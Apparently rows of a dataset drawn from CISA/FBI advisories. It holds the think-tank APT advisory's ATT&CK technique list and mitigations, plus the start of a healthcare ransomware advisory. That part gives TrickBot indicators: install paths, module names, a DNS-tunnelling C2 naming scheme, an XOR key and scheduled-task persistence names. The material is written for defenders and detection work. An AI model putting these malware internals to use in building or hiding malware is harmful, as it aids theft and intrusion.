References,1, ZDNet: A Second Hacking Group has Targeted SolarWinds Systems,2, CISA: Supply Chain Compromise,3, Microsoft SolarWinds Post-Compromise Hunting with Azure Sentinel,4, Microsoft Solorigate Resource Center,5, Advanced Audit in Microsoft 365,6, Microsoft: Understanding “Solorigate’s” Identity IOCs,7, Detection and Hunting of Golden SAML Attack:,8, Ibid,9, Ibid,10, Microsoft: AADServicePrincipalSignInLogs,11, Microsoft: Understanding “Solorigate’s” Identity IOCs,12, Azure Active Directory Sign-in Activity Reports,13, CrowdStrike: CrowdStrike Launches Free Tool to Identify and Help Mitigate Risks in Azure Active Directory,14, Microsoft 365 App for Splunk 

Revisions

Initial version: January 8, 2021|February 4, 2021: Removed link and section for outdated product feedback form|April 8, 2021: Added Aviary Dashboard information|April 15, 2021: Added Attribution Statement






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-008a
69,"




Summary

This Advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
The Cybersecurity and Infrastructure Security Agency (CISA) and the Federal Bureau of Investigation (FBI) have observed persistent continued cyber intrusions by advanced persistent threat (APT) actors targeting U.S. think tanks. This malicious activity is often, but not exclusively, directed at individuals and organizations that focus on international affairs or national security policy.[1] The following guidance may assist U.S. think tanks in developing network defense procedures to prevent or rapidly detect these attacks.
APT actors have relied on multiple avenues for initial access. These have included low-effort capabilities such as spearphishing emails and third-party message services directed at both corporate and personal accounts, as well as exploiting vulnerable web-facing devices and remote connection capabilities. Increased telework during the COVID-19 pandemic has expanded workforce reliance on remote connectivity, affording malicious actors more opportunities to exploit those connections and to blend in with increased traffic. Attackers may leverage virtual private networks (VPNs) and other remote work tools to gain initial access or persistence on a victim’s network. When successful, these low-effort, high-reward approaches allow threat actors to steal sensitive information, acquire user credentials, and gain persistent access to victim networks.
Given the importance that think tanks can have in shaping U.S. policy, CISA and FBI urge individuals and organizations in the international affairs and national security sectors to immediately adopt a heightened state of awareness and implement the critical steps listed in the Mitigations section of this Advisory.
Click here for a PDF version of this report.

Technical Details

ATT&CK Profile
CISA created the following MITRE ATT&CK profile to provide a non-exhaustive list of tactics, techniques, and procedures (TTPs) employed by APT actors to break through think tanks’ defenses, conduct reconnaissance in their environments, exfiltrate proprietary or confidential information, and execute effects on targets. These TTPs were included based upon closed reporting on APT actors that are known to target think tanks or based upon CISA incident response data.

Initial Access [TA0001]

Valid Accounts [T1078]
Valid Accounts: Cloud Accounts [T1078.004]
External Remote Services [T1133]
Drive-by Compromise [T1189]
Exploit Public-Facing Application [T1190]

Supply Chain Compromise: Compromise Software Supply Chain [T1195.002]
Trusted Relationship [T1199]
Phishing: Spearphishing Attachment [T1566.001]
Phishing: Spearphishing Link [T1566.002]
Phishing: Spearphishing via Service [T1566.003]




Execution [TA0002]

Windows Management Instrumentation [T1047]
Scheduled Task/Job: Scheduled Task [T1053.005]
Command and Scripting Interpreter: PowerShell [T1059.001]
Command and Scripting Interpreter: Windows Command Shell [T1059.003]
Command and Scripting Interpreter: Unix Shell [T1059.004]
Command and Scripting Interpreter: Visual Basic [T1059.005]
Command and Scripting Interpreter: Python [T1059.006]
Native API [T1106]
Exploitation for Client Execution [T1203]
User Execution: Malicious Link [T1204.001]
User Execution: Malicious File [T1204.002]
Inter-Process Communication: Dynamic Data Exchange [T1559.002]
System Services: Service Execution [T1569.002]


Persistence [TA0003]

Boot or Logon Initialization Scripts: Logon Script (Windows) [T1037.001]
Scheduled Task/Job: Scheduled Task [T1053.005]
Account Manipulation: Exchange Email Delegate Permissions [T1098.002]
Create Account: Local Account [T1136.001]
Office Application Startup: Office Test [T1137.002]
Office Application Startup: Outlook Home Page [T1137.004]
Browser Extensions [T1176]
BITS Jobs [T1197]
Server Software Component: Web Shell [T1505.003]
Pre-OS Boot: Bootkit [T1542.003]
Create or Modify System Process: Windows Service [T1543.003]
Event Triggered Execution: Change Default File Association [T1546.001]
Event Triggered Execution: Windows Management Instrumentation Event Subscription [T1546.003]
Event Triggered Execution: Accessibility Features [T1546.008]
Event Triggered Execution: Component Object Model Hijacking [T1546.015]
Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder [T1547.001]
Boot or Logon Autostart Execution: Shortcut Modification [T1547.009]


Privilege Escalation [TA0004]

Process Injection [T1055]
Process Injection: Process Hollowing [T1055.012]
Exploitation for Privilege Escalation [T1068]
Access Token Manipulation: Token Impersonation/Theft [T1134.001]
Event Triggered Execution: Accessibility Features [T1546.008]
Boot or Logon Autostart Execution: Shortcut Modification [T1547.009]
Abuse Elevation Control Mechanism: Bypass User Access Control [T1548.002]
Hijack Execution Flow: DLL Side-Loading [T1574.002]


Defense Evasion [TA0005]

Rootkit [T1014]
Obfuscated Files or Information: Binary Padding [T1027.001]
Obfuscated Files or Information: Software Packing [T1027.002]
Obfuscated Files or Information: Steganography [T1027.003]
Obfuscated Files or Information: Indicator Removal from Tools [T1027.005]
Masquerading: Match Legitimate Name or Location [T1036.005]
Indicator Removal on Host: Clear Windows Event Logs [T1070.001]
Indicator Removal on Host: Clear Command History [1070.003]
Indicator Removal on Host: File Deletion [T1070.004]
Indicator Removal on Host: Timestomp [T1070.006]
Modify Registry [T1112]
Deobfuscate/Decode Files or Information [T1140]
Exploitation for Defense Evasion [T1211]
Signed Binary Proxy Execution: Compiled HTML File [T1218.001]
Signed Binary Proxy Execution: Mshta [T1218.005]
Signed Binary Proxy Execution: Rundll32 [T1218.011]
Template Injection [T1221]
Execution Guardrails: Environmental Keying [T1480.001]
Abuse Elevation Control Mechanism: Bypass User Access Control [T1548.002]
Use Alternate Authentication Material: Application Access Token [T1550.001]
Subvert Trust Controls: Code Signing [T1553.002]
Impair Defenses: Disable or Modify Tools [T1562.001]
Impair Defenses: Disable or Modify System Firewall [T1562.004]
Hide Artifacts: Hidden Files and Directories [T1564.001]
Hide Artifacts: Hidden Window [T1564.003]


Credential Access [TA0006]

OS Credential Dumping: LSASS Memory [T1003.001]
OS Credential Dumping: Security Account Manager [T1003.002]
OS Credential Dumping: NTDS [T1003.003]
OS Credential Dumping: LSA Secrets [T1003.004]
OS Credential Dumping: Cached Domain Credentials [T1003.005]
Network Sniffing [T1040]
Input Capture: Keylogging [T1056.001]
Brute Force: Password Cracking [T1110.002]Brute Force: Password Spraying [T1110.003]
Forced Authentication [T1187]
Steal Application Access Token [T1528]
Unsecured Credentials: Credentials in Files [T1552.001]
Unsecured Credentials: Group Policy Preferences [T1552.006]
Credentials from Password Stores: Credentials from Web Browsers [T1555.003]


Discovery [TA0007]

System Service Discovery [T1007]
Query Registry [T1012]
System Network Configuration Discovery [T1016]
Remote System Discovery [T1018]
System Owner/User Discovery [T1033]
Network Sniffing [T1040]
Network Service Scanning [T1046]
System Network Connections Discovery [T1049]
Process Discovery [T1057]
Permission Groups Discovery: Local Groups [T1069.001]
Permission Groups Discovery: Domain Groups [T1069.002]
System Information Discovery [T1082]
File and Directory Discovery [T1083]
Account Discovery: Local Account [T1087.001]
Account Discovery: Domain Account [T1087.002]
Peripheral Device Discovery [T1120]
Network Share Discovery [T1135]
Password Policy Discovery [T1201]
Software Discovery: Security Software Discovery [T1518.001]


Lateral Movement [TA0008]

Remote Services: Remote Desktop Protocol [T1021.001]
Remote Services: SSH [T1021.004]
Taint Shared Content [T1080]
Replication Through Removable Media [T1091]
Exploitation of Remote Services [T1210]
Use Alternate Authentication Material: Pass the Hash [T1550.002]
Use Alternate Authentication Material: Pass the Ticket [T1550.003]


Collection [TA0009]

Data from Local System [T1005]
Data from Removable Media [T1025]
Data Staged: Local Data Staging [T1074.001]
Screen Capture [T1113]
Email Collection: Local Email Collection [T1114.001]
Email Collection: Remote Email Collection [T1114.002]
Automated Collection [T1119]
Audio Capture [T1123]
Data from Information Repositories: SharePoint [T1213.002]
Archive Collected Data: Archive via Utility [T1560.001]
Archive Collected Data: Archive via Custom Method [T1560.003]


Command and Control [TA0011]

Data Obfuscation: Junk Data [T1001.001]
Fallback Channels [T1008]
Application Layer Protocol: Web Protocols [T1071.001]
Application Layer Protocol: File Transfer Protocols [T1071.002]
Application Layer Protocol: Mail Protocols [T1071.003]
Application Layer Protocol: DNS [T1071.004]
Proxy: External Proxy [T1090.002]
Proxy: Multi-hop Proxy [T1090.003]
Proxy: Domain Fronting [T1090.004]
Communication Through Removable Media [T1092]
Non-Application Layer Protocol [T1095]
Web Service: Dead Drop Resolver [T1102.001]
Web Service: Bidirectional Communication [T1102.002]
Multi-Stage Channels [T1104]
Ingress Tool Transfer [T1105]
Data Encoding: Standard Encoding [T1132.001]
Remote Access Software [T1219]
Dynamic Resolution: Domain Generation Algorithms [T1568.002]
Non-Standard Port [T1571]
Protocol Tunneling [T1572]
Encrypted Channel: Symmetric Cryptography [T1573.001]
Encrypted Channel: Asymmetric Cryptography [T1573.002]


 Exfiltration [TA0010]

Exfiltration Over C2 Channel [T1041]
Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol [T1048.003]


Impact [TA0040]

Data Encrypted for Impact [T1486]
Resource Hijacking [T1496]
System Shutdown/Reboot [T1529]
Disk Wipe: Disk Structure Wipe [T1561.002]




Mitigations

CISA and FBI recommend think tank organizations apply the following critical practices to strengthen their security posture.
Leaders

Implement a training program to familiarize users with identifying social engineering techniques and phishing emails.

Users/Staff

Log off remote connections when not in use.
Be vigilant against tailored spearphishing attacks targeting corporate and personal accounts (including both email and social media accounts).
Use different passwords for corporate and personal accounts.
Install antivirus software on personal devices to automatically scan and quarantine suspicious files.
Employ strong multi-factor authentication for personal accounts, if available.
Exercise caution when:

Opening email attachments, even if the attachment is expected and the sender appears to be known. See Using Caution with Email Attachments.
Using removable media (e.g., USB thumb drives, external drives, CDs).



IT Staff/Cybersecurity Personnel

Segment and segregate networks and functions.
Change the default username and password of applications and appliances.
Employ strong multi-factor authentication for corporate accounts.
Deploy antivirus software on organizational devices to automatically scan and quarantine suspicious files.
Apply encryption to data at rest and data in transit.
Use email security appliances to scan and remove malicious email attachments or links.
Monitor key internal security tools and identify anomalous behavior. Flag any known indicators of compromise or threat actor behaviors for immediate response.
Organizations can implement mitigations of varying complexity and restrictiveness to reduce the risk posed by threat actors who use Tor (The Onion Router) to carry out malicious activities. See the CISA-FBI Joint Cybersecurity Advisory on Defending Against Malicious Cyber Activity Originating from Tor for mitigation options and additional information.
Prevent exploitation of known software vulnerabilities by routinely applying software patches and upgrades. Foreign cyber threat actors continue to exploit publicly known—and often dated—software vulnerabilities against broad target sets, including public and private sector organizations. If these vulnerabilities are left unpatched, exploitation often requires few resources and provides threat actors with easy access to victim networks. Review CISA and FBI’s Top 10 Routinely Exploited Vulnerabilities and other CISA alerts that identify vulnerabilities exploited by foreign attackers.
Implement an antivirus program and a formalized patch management process.
Block certain websites and email attachments commonly associated with malware (e.g., .scr, .pif, .cpl, .dll, .exe).
Block email attachments that cannot be scanned by antivirus software (e.g., .zip files).
Implement Group Policy Object and firewall rules.
Implement filters at the email gateway and block suspicious IP addresses at the firewall.
Routinely audit domain and local accounts as well as their permission levels to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.
Follow best practices for design and administration of the network to limit privileged account use across administrative tiers.
Implement a Domain-Based Message Authentication, Reporting & Conformance (DMARC) validation system.
Disable or block unnecessary remote services.
Limit access to remote services through centrally managed concentrators.
Deny direct remote access to internal systems or resources by using network proxies, gateways, and firewalls.
Limit unnecessary lateral communications.
Disable file and printer sharing services. If these services are required, use strong passwords or Active Directory authentication.
Ensure applications do not store sensitive data or credentials insecurely.
Enable a firewall on agency workstations, configured to deny unsolicited connection requests.
Disable unnecessary services on agency workstations and servers.
Scan for and remove suspicious email attachments; ensure any scanned attachment is its ""true file type"" (i.e., the extension matches the file header).
Monitor users' web browsing habits; restrict access to suspicious or risky sites. Contact law enforcement or CISA immediately regarding any unauthorized network access identified.
Visit the MITRE ATT&CK techniques and tactics pages linked in the ATT&CK Profile section above for additional mitigation and detection strategies for this malicious activity targeting think tanks.


Contact Information

Recipients of this report are encouraged to contribute any additional information that they may have related to this threat. To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by email at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.gov.
References

CISA Alert: Microsoft Office 365 Security Recommendations
CISA Alert: Technical Approaches to Uncovering and Remediating Malicious Activity
CISA Webpage: Telework Guidance
CISA Webpage: VPN-Related Guidance
FBI Private Industry Notification: PIN 20200409-001


References

[1] CyberScoop: As Europe prepares to vote, Microsoft warns of Fancy Bear attacks on democratic think tanks

Revisions

Initial Version: December 1, 2020






This product is provided subject to this Notification and this Privacy & Use policy.


","{'TA0008', 'T1027.003', 'T1566.002', 'T1560.003', 'T1001.001', 'T1529', 'T1505.003', 'T1203', 'T1204.002', 'T1027.005', 'T1069.001', 'T1112', 'T1087.001', 'T1140', 'T1564.001', 'T1008', 'T1542.003', 'T1204.001', 'T1098.002', 'T1552.001', 'T1059.005', 'T1007', 'T1574.002', 'T1071.003', 'T1048.003', 'T1547.001', 'TA0009', 'T1136.001', 'TA0040', 'T1187', 'TA0007', 'T1195.002', 'T1137.004', 'T1090.003', 'T1041', 'TA0003', 'T1083', 'T1573.002', 'T1003.002', 'T1562.001', 'T1071.002', 'T1025', 'T1078.004', 'T1219', 'T1550.003', 'T1553.002', 'TA0010', 'T1059.004', 'T1573.001', 'T1021.004', 'T1210', 'T1546.008', 'T1560.001', 'T1102.002', 'T1036.005', 'T1546.015', 'T1082', 'T1049', 'T1550.002', 'T1110.003', 'T1135', 'T1211', 'T1518.001', 'T1056.001', 'T1221', 'TA0002', 'T1201', 'T1027.002', 'T1071.001', 'T1047', 'T1106', 'T1568.002', 'T1059.003', 'T1546.001', 'T1055', 'T1218.001', 'T1555.003', 'T1090.002', 'T1027.001', 'T1550.001', 'T1134.001', 'T1571', 'T1040', 'T1176', 'TA0006', 'T1014', 'T1190', 'T1068', 'T1546.003', 'T1074.001', 'T1110.002', 'T1003.001', 'T1003.005', 'T1114.001', 'T1572', 'T1552.006', 'T1561.002', 'T1080', 'T1199', 'T1132.001', 'T1078', 'T1070.004', 'T1071.004', 'T1046', 'T1566.001', 'T1070.006', 'T1133', 'T1104', 'T1102.001', 'T1059.001', 'T1033', 'T1528', 'T1123', 'T1090.004', 'T1496', 'T1189', 'T1021.001', 'T1486', 'T1547.009', 'T1092', 'T1003.004', 'T1137.002', 'T1114.002', 'T1119', 'T1566.003', 'T1569.002', 'T1005', 'T1037.001', 'TA0005', 'T1213.002', 'T1016', 'T1055.012', 'T1069.002', 'T1087.002', 'T1018', 'T1113', 'T1105', 'T1218.005', 'TA0011', 'T1091', 'T1059.006', 'T1564.003', 'T1543.003', 'T1218.011', 'T1559.002', 'TA0001', 'T1057', 'T1480.001', 'T1012', 'T1197', 'T1003.003', 'TA0004', 'T1095', 'T1053.005', 'T1070.001', 'T1120', 'T1548.002', 'T1562.004'}","




Summary

This Advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
The Cybersecurity and Infrastructure Security Agency (CISA) and the Federal Bureau of Investigation (FBI) have observed persistent continued cyber intrusions by advanced persistent threat (APT) actors targeting U.S. think tanks. This malicious activity is often, but not exclusively, directed at individuals and organizations that focus on international affairs or national security policy.,1, The following guidance may assist U.S. think tanks in developing network defense procedures to prevent or rapidly detect these attacks.
APT actors have relied on multiple avenues for initial access. These have included low-effort capabilities such as spearphishing emails and third-party message services directed at both corporate and personal accounts, as well as exploiting vulnerable web-facing devices and remote connection capabilities. Increased telework during the COVID-19 pandemic has expanded workforce reliance on remote connectivity, affording malicious actors more opportunities to exploit those connections and to blend in with increased traffic. Attackers may leverage virtual private networks (VPNs) and other remote work tools to gain initial access or persistence on a victim’s network. When successful, these low-effort, high-reward approaches allow threat actors to steal sensitive information, acquire user credentials, and gain persistent access to victim networks.
Given the importance that think tanks can have in shaping U.S. policy, CISA and FBI urge individuals and organizations in the international affairs and national security sectors to immediately adopt a heightened state of awareness and implement the critical steps listed in the Mitigations section of this Advisory.
Click here for a PDF version of this report.

Technical Details

ATT&CK Profile
CISA created the following MITRE ATT&CK profile to provide a non-exhaustive list of tactics, techniques, and procedures (TTPs) employed by APT actors to break through think tanks’ defenses, conduct reconnaissance in their environments, exfiltrate proprietary or confidential information, and execute effects on targets. These TTPs were included based upon closed reporting on APT actors that are known to target think tanks or based upon CISA incident response data.

Initial Access,

Valid Accounts,
Valid Accounts: Cloud Accounts,
External Remote Services,
Drive-by Compromise,
Exploit Public-Facing Application,

Supply Chain Compromise: Compromise Software Supply Chain,
Trusted Relationship,
Phishing: Spearphishing Attachment,
Phishing: Spearphishing Link,
Phishing: Spearphishing via Service,




Execution,

Windows Management Instrumentation,
Scheduled Task/Job: Scheduled Task,
Command and Scripting Interpreter: PowerShell,
Command and Scripting Interpreter: Windows Command Shell,
Command and Scripting Interpreter: Unix Shell,
Command and Scripting Interpreter: Visual Basic,
Command and Scripting Interpreter: Python,
Native API,
Exploitation for Client Execution,
User Execution: Malicious Link,
User Execution: Malicious File,
Inter-Process Communication: Dynamic Data Exchange,
System Services: Service Execution,


Persistence,

Boot or Logon Initialization Scripts: Logon Script (Windows),
Scheduled Task/Job: Scheduled Task,
Account Manipulation: Exchange Email Delegate Permissions,
Create Account: Local Account,
Office Application Startup: Office Test,
Office Application Startup: Outlook Home Page,
Browser Extensions,
BITS Jobs,
Server Software Component: Web Shell,
Pre-OS Boot: Bootkit,
Create or Modify System Process: Windows Service,
Event Triggered Execution: Change Default File Association,
Event Triggered Execution: Windows Management Instrumentation Event Subscription,
Event Triggered Execution: Accessibility Features,
Event Triggered Execution: Component Object Model Hijacking,
Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,
Boot or Logon Autostart Execution: Shortcut Modification,


Privilege Escalation,

Process Injection,
Process Injection: Process Hollowing,
Exploitation for Privilege Escalation,
Access Token Manipulation: Token Impersonation/Theft,
Event Triggered Execution: Accessibility Features,
Boot or Logon Autostart Execution: Shortcut Modification,
Abuse Elevation Control Mechanism: Bypass User Access Control,
Hijack Execution Flow: DLL Side-Loading,


Defense Evasion,

Rootkit,
Obfuscated Files or Information: Binary Padding,
Obfuscated Files or Information: Software Packing,
Obfuscated Files or Information: Steganography,
Obfuscated Files or Information: Indicator Removal from Tools,
Masquerading: Match Legitimate Name or Location,
Indicator Removal on Host: Clear Windows Event Logs,
Indicator Removal on Host: Clear Command History,1070.003,
Indicator Removal on Host: File Deletion,
Indicator Removal on Host: Timestomp,
Modify Registry,
Deobfuscate/Decode Files or Information,
Exploitation for Defense Evasion,
Signed Binary Proxy Execution: Compiled HTML File,
Signed Binary Proxy Execution: Mshta,
Signed Binary Proxy Execution: Rundll32,
Template Injection,
Execution Guardrails: Environmental Keying,
Abuse Elevation Control Mechanism: Bypass User Access Control,
Use Alternate Authentication Material: Application Access Token,
Subvert Trust Controls: Code Signing,
Impair Defenses: Disable or Modify Tools,
Impair Defenses: Disable or Modify System Firewall,
Hide Artifacts: Hidden Files and Directories,
Hide Artifacts: Hidden Window,


Credential Access,

OS Credential Dumping: LSASS Memory,
OS Credential Dumping: Security Account Manager,
OS Credential Dumping: NTDS,
OS Credential Dumping: LSA Secrets,
OS Credential Dumping: Cached Domain Credentials,
Network Sniffing,
Input Capture: Keylogging,
Brute Force: Password Cracking,Brute Force: Password Spraying,
Forced Authentication,
Steal Application Access Token,
Unsecured Credentials: Credentials in Files,
Unsecured Credentials: Group Policy Preferences,
Credentials from Password Stores: Credentials from Web Browsers,


Discovery,

System Service Discovery,
Query Registry,
System Network Configuration Discovery,
Remote System Discovery,
System Owner/User Discovery,
Network Sniffing,
Network Service Scanning,
System Network Connections Discovery,
Process Discovery,
Permission Groups Discovery: Local Groups,
Permission Groups Discovery: Domain Groups,
System Information Discovery,
File and Directory Discovery,
Account Discovery: Local Account,
Account Discovery: Domain Account,
Peripheral Device Discovery,
Network Share Discovery,
Password Policy Discovery,
Software Discovery: Security Software Discovery,


Lateral Movement,

Remote Services: Remote Desktop Protocol,
Remote Services: SSH,
Taint Shared Content,
Replication Through Removable Media,
Exploitation of Remote Services,
Use Alternate Authentication Material: Pass the Hash,
Use Alternate Authentication Material: Pass the Ticket,


Collection,

Data from Local System,
Data from Removable Media,
Data Staged: Local Data Staging,
Screen Capture,
Email Collection: Local Email Collection,
Email Collection: Remote Email Collection,
Automated Collection,
Audio Capture,
Data from Information Repositories: SharePoint,
Archive Collected Data: Archive via Utility,
Archive Collected Data: Archive via Custom Method,


Command and Control,

Data Obfuscation: Junk Data,
Fallback Channels,
Application Layer Protocol: Web Protocols,
Application Layer Protocol: File Transfer Protocols,
Application Layer Protocol: Mail Protocols,
Application Layer Protocol: DNS,
Proxy: External Proxy,
Proxy: Multi-hop Proxy,
Proxy: Domain Fronting,
Communication Through Removable Media,
Non-Application Layer Protocol,
Web Service: Dead Drop Resolver,
Web Service: Bidirectional Communication,
Multi-Stage Channels,
Ingress Tool Transfer,
Data Encoding: Standard Encoding,
Remote Access Software,
Dynamic Resolution: Domain Generation Algorithms,
Non-Standard Port,
Protocol Tunneling,
Encrypted Channel: Symmetric Cryptography,
Encrypted Channel: Asymmetric Cryptography,


 Exfiltration,

Exfiltration Over C2 Channel,
Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,


Impact,

Data Encrypted for Impact,
Resource Hijacking,
System Shutdown/Reboot,
Disk Wipe: Disk Structure Wipe,




Mitigations

CISA and FBI recommend think tank organizations apply the following critical practices to strengthen their security posture.
Leaders

Implement a training program to familiarize users with identifying social engineering techniques and phishing emails.

Users/Staff

Log off remote connections when not in use.
Be vigilant against tailored spearphishing attacks targeting corporate and personal accounts (including both email and social media accounts).
Use different passwords for corporate and personal accounts.
Install antivirus software on personal devices to automatically scan and quarantine suspicious files.
Employ strong multi-factor authentication for personal accounts, if available.
Exercise caution when:

Opening email attachments, even if the attachment is expected and the sender appears to be known. See Using Caution with Email Attachments.
Using removable media (e.g., USB thumb drives, external drives, CDs).



IT Staff/Cybersecurity Personnel

Segment and segregate networks and functions.
Change the default username and password of applications and appliances.
Employ strong multi-factor authentication for corporate accounts.
Deploy antivirus software on organizational devices to automatically scan and quarantine suspicious files.
Apply encryption to data at rest and data in transit.
Use email security appliances to scan and remove malicious email attachments or links.
Monitor key internal security tools and identify anomalous behavior. Flag any known indicators of compromise or threat actor behaviors for immediate response.
Organizations can implement mitigations of varying complexity and restrictiveness to reduce the risk posed by threat actors who use Tor (The Onion Router) to carry out malicious activities. See the CISA-FBI Joint Cybersecurity Advisory on Defending Against Malicious Cyber Activity Originating from Tor for mitigation options and additional information.
Prevent exploitation of known software vulnerabilities by routinely applying software patches and upgrades. Foreign cyber threat actors continue to exploit publicly known—and often dated—software vulnerabilities against broad target sets, including public and private sector organizations. If these vulnerabilities are left unpatched, exploitation often requires few resources and provides threat actors with easy access to victim networks. Review CISA and FBI’s Top 10 Routinely Exploited Vulnerabilities and other CISA alerts that identify vulnerabilities exploited by foreign attackers.
Implement an antivirus program and a formalized patch management process.
Block certain websites and email attachments commonly associated with malware (e.g..scr.pif.cpl.dll.exe).
Block email attachments that cannot be scanned by antivirus software (e.g..zip files).
Implement Group Policy Object and firewall rules.
Implement filters at the email gateway and block suspicious IP addresses at the firewall.
Routinely audit domain and local accounts as well as their permission levels to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.
Follow best practices for design and administration of the network to limit privileged account use across administrative tiers.
Implement a Domain-Based Message Authentication, Reporting & Conformance (DMARC) validation system.
Disable or block unnecessary remote services.
Limit access to remote services through centrally managed concentrators.
Deny direct remote access to internal systems or resources by using network proxies, gateways, and firewalls.
Limit unnecessary lateral communications.
Disable file and printer sharing services. If these services are required, use strong passwords or Active Directory authentication.
Ensure applications do not store sensitive data or credentials insecurely.
Enable a firewall on agency workstations, configured to deny unsolicited connection requests.
Disable unnecessary services on agency workstations and servers.
Scan for and remove suspicious email attachments; ensure any scanned attachment is its ""true file type"" (i.e., the extension matches the file header).
Monitor users' web browsing habits; restrict access to suspicious or risky sites. Contact law enforcement or CISA immediately regarding any unauthorized network access identified.
Visit the MITRE ATT&CK techniques and tactics pages linked in the ATT&CK Profile section above for additional mitigation and detection strategies for this malicious activity targeting think tanks.


Contact Information

Recipients of this report are encouraged to contribute any additional information that they may have related to this threat. To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by email at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.gov.
References

CISA Alert: Microsoft Office 365 Security Recommendations
CISA Alert: Technical Approaches to Uncovering and Remediating Malicious Activity
CISA Webpage: Telework Guidance
CISA Webpage: VPN-Related Guidance
FBI Private Industry Notification: PIN 20200409-001


References,1, CyberScoop: As Europe prepares to vote, Microsoft warns of Fancy Bear attacks on democratic think tanks

Revisions

Initial Version: December 1, 2020






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-336a
70,"




Summary

This advisory was updated to include information on Conti, TrickBot, and BazarLoader, including new IOCs and Yara Rules for detection.
This advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) version 7 framework. See the ATT&CK for Enterprise version 7 for all referenced threat actor tactics and techniques.
This joint cybersecurity advisory was coauthored by the Cybersecurity and Infrastructure Security Agency (CISA), the Federal Bureau of Investigation (FBI), and the Department of Health and Human Services (HHS). This advisory describes the tactics, techniques, and procedures (TTPs) used by cybercriminals against targets in the Healthcare and Public Health (HPH) Sector to infect systems with ransomware, notably Ryuk and Conti, for financial gain.
CISA, FBI, and HHS have credible information of an increased and imminent cybercrime threat to U.S. hospitals and healthcare providers. CISA, FBI, and HHS are sharing this information to provide warning to healthcare providers to ensure that they take timely and reasonable precautions to protect their networks from these threats.
Click here for a PDF version of this report.
Key Findings

CISA, FBI, and HHS assess malicious cyber actors are targeting the HPH Sector with TrickBot and BazarLoader malware, often leading to ransomware attacks, data theft, and the disruption of healthcare services.
These issues will be particularly challenging for organizations within the COVID-19 pandemic; therefore, administrators will need to balance this risk when determining their cybersecurity investments.


Technical Details

Threat Details
The cybercriminal enterprise behind TrickBot, which is likely also the creator of BazarLoader malware, has continued to develop new functionality and tools, increasing the ease, speed, and profitability of victimization. These threat actors increasingly use loaders—like TrickBot and BazarLoader (or BazarBackdoor)—as part of their malicious cyber campaigns. Cybercriminals disseminate TrickBot and BazarLoader via phishing campaigns that contain either links to malicious websites that host the malware or attachments with the malware. Loaders start the infection chain by distributing the payload; they deploy and execute the backdoor from the command and control (C2) server and install it on the victim’s machine.
TrickBot
What began as a banking trojan and descendant of Dyre malware, TrickBot now provides its operators a full suite of tools to conduct a myriad of illegal cyber activities. These activities include credential harvesting, mail exfiltration, cryptomining, point-of-sale data exfiltration, and the deployment of ransomware, such as Ryuk and Conti.
In early 2019, the FBI began to observe new TrickBot modules named Anchor, which cyber actors typically used in attacks targeting high-profile victims—such as large corporations. These attacks often involved data exfiltration from networks and point-of-sale devices. As part of the new Anchor toolset, TrickBot developers created anchor_dns, a tool for sending and receiving data from victim machines using Domain Name System (DNS) tunneling.
anchor_dns is a backdoor that allows victim machines to communicate with C2 servers over DNS to evade typical network defense products and make their malicious communications blend in with legitimate DNS traffic. anchor_dns uses a single-byte XOR cipher to encrypt its communications, which have been observed using key 0xB9. Once decrypted, the string anchor_dns can be found in the DNS request traffic.
TrickBot Indicators of Compromise
After successful execution of the malware, TrickBot copies itself as an executable file with a 12-character randomly generated file name (e.g. mfjdieks.exe) and places this file in one of the following directories.

C:\Windows\
C:\Windows\SysWOW64\
C:\Users\[Username]\AppData\Roaming\

Once the executable is running and successful in establishing communication with C2s, the executable places appropriate modules downloaded from C2s for the infected processor architecture type (32 or 64 bit instruction set), to the infected host’s %APPDATA% or %PROGRAMDATA% directory, such as %AppData\Roaming\winapp. Some commonly named plugins that are created in a Modules subdirectory are (the detected architecture is appended to the module filename, e.g., importDll32 or importDll64):

Systeminfo
importDll
outlookDll
injectDll with a directory (ex. injectDLL64_configs) containing configuration files:

dinj
sinj
dpost


mailsearcher with a directory (ex. mailsearcher64_configs) containing configuration file:

mailconf


networkDll with a directory (ex. networkDll64_configs) containing configuration file:

dpost


wormDll
tabDll
shareDll

Filename client_id or data or FAQ with the assigned bot ID of the compromised system is created in the malware directory. Filename group_tag or Readme.md containing the TrickBot campaign IDs is created in the malware directory.
The malware may also drop a file named anchorDiag.txt in one of the directories listed above.
Part of the initial network communications with the C2 server involves sending information about the victim machine such as its computer name/hostname, operating system version, and build via a base64-encoded GUID. The GUID is composed of /GroupID/ClientID/ with the following naming convention:
/anchor_dns/[COMPUTERNAME]_[WindowsVersionBuildNo].[32CharacterString]/.
The malware uses scheduled tasks that run every 15 minutes to ensure persistence on the victim machine. The scheduled task typically uses the following naming convention.
[random_folder_name_in_%APPDATA%_excluding_Microsoft]
autoupdate#[5_random_numbers] (e.g., Task autoupdate#16876).
